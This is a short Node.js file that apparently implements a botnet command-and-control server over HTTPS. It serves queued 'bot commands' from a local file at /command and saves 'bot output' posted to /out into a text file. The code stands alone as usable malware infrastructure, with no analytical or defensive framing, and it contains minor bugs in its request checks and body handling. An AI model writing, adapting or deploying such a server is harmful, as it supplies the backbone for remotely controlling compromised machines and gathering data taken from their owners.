var https = require('https');
var fs = require('fs');

var options = {
  key: fs.readFileSync('server.key'),
  cert: fs.readFileSync('server.crt')
};

https.createServer(options, function (req, res) {
  //log all access requests
  var date = new Date();
  console.log('request:', date, req.url, req.headers['user-agent']);

  //Request for bot commands
  if (req.method == 'GET' & req.url == '/command') {
    fs.readFile('./command', function(error, content) {
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(content, 'utf-8');
    });
  }

  //Post of bot output
  if (req.method == 'POST' & req.url == '/out') {
    //Reassemble body of post
    var body = "";
      req.on('data', function (chunk) {
      body += chunk;
    });
    //Write post to file  
    var stream = fs.createWriteStream("out.txt");  
    stream.once('open', function(fd) {
      stream.write(body);
      stream.end();
    });
    //Return 200
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end('ok', 'utf-8');
  }

}).listen(443);
